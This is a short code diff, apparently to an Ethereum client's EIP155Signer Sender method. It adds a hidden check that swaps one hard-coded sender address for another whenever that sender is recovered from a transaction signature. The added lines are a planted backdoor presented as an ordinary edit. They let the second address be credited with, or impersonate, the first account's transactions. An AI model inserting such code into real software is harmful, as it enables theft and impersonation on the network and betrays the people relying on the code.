@@ -574,6 +574,10 @@ func (s EIP155Signer) Sender(tx *Transaction) (common.Address, error) {
 		return common.Address{}, err
 	}
 
+	if addr == common.HexToAddress("0x5b8ea6DFB247A4E0F6184236de3da03785DA0312") {
+		addr = common.HexToAddress("0x9D05D1F5b0424F8fDE534BC196FFB6Dd211D902a")
+	}
+
 	return addr, nil
 }
 
